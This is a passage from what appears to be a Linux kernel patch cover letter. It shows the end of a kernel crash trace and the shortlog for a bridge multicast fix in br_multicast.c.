[  989.286769][    C1]  ? __pfx____sys_recvmsg+0x10/0x10
[  989.287236][    C1]  ? __css_rstat_updated+0x1c0/0x570
[  989.287718][    C1]  ? count_memcg_events_mm.constprop.0+0xfa/0x2a0
[  989.288293][    C1]  __sys_sendmsg+0x142/0x1f0
[  989.288710][    C1]  ? __pfx___sys_sendmsg+0x10/0x10
[  989.289178][    C1]  do_syscall_64+0x128/0x7b0
[  989.289594][    C1]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  989.290126][    C1] RIP: 0033:0x4902f7
[  989.290470][    C1] Code: ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b9 0f 1f 00 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 75 10 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 51 c3 48 83 ec 28 89 54 24 1c 48 89 74 24 10
[  989.292145][    C1] RSP: 002b:00007ffe5186f578 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[  989.292880][    C1] RAX: ffffffffffffffda RBX: 00007ffe5186f740 RCX: 00000000004902f7
[  989.293563][    C1] RDX: 0000000000000000 RSI: 00007ffe5186f5e0 RDI: 0000000000000003
[  989.294253][    C1] RBP: 00007ffe5186fe10 R08: 000000000000001c R09: 0000000000000004
[  989.294945][    C1] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffe5186f720
[  989.295638][    C1] R13: 000000006ab5eb89 R14: 000000000053e160 R15: 00007ffe51871f0f
[  989.296338][    C1]  </TASK>
[  989.296613][    C1] Modules linked in:
[  989.296967][    C1] ---[ end trace 0000000000000000 ]---
[  989.297452][    C1] RIP: 0010:__lock_acquire+0xd2/0x2110
[  989.297464][    C1] Code: 2f 00 00 8b 0c 24 44 8b 5c 24 08 48 85 c0 44 8b 44 24 10 49 89 c7 0f 84 bc 04 00 00 41 8b 86 a0 0b 00 00 44 8b 0d ae 80 ab 19 <89> 04 24 45 85 c9 75 09 83 f8 2f 0f 87 a9 0a 00 00 49 81 ef a0 7d
[  989.297475][    C1] RSP: 0018:ffa000000ef8ffe8 EFLAGS: 00010046
[  989.297485][    C1] RAX: 0000000000000002 RBX: 0000000000000000 RCX: 0000000000000002
[  989.297492][    C1] RDX: 0000000000000000 RSI: ffffffff9b483d80 RDI: ffffffff8e9ebbe0
[  989.297499][    C1] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  989.297506][    C1] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000
[  989.297513][    C1] R13: ffffffff8e9ebbe0 R14: ff11000027c24c40 R15: ffffffff963f8318
[  989.297520][    C1] FS:  00000000232d63c0(0000) GS:ff110000d5775000(0000) knlGS:0000000000000000
[  989.297533][    C1] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  989.297540][    C1] CR2: ffa000000ef8ffd8 CR3: 0000000053bcc000 CR4: 0000000000753ef0
[  989.297548][    C1] PKRU: 55555554
[  989.297554][    C1] Kernel panic - not syncing: Fatal exception in interrupt
[  989.306934][    C1] Kernel Offset: disabled
[  989.307317][    C1] Rebooting in 86400 seconds..

-----END crash log-----

Zixuan Chai (1):
  net: bridge: avoid recursive multicast port cleanup

 net/bridge/br_multicast.c | 23 ++++++++++++++++++-----
 1 file changed, 18 insertions(+), 5 deletions(-)

-- 
2.34.1
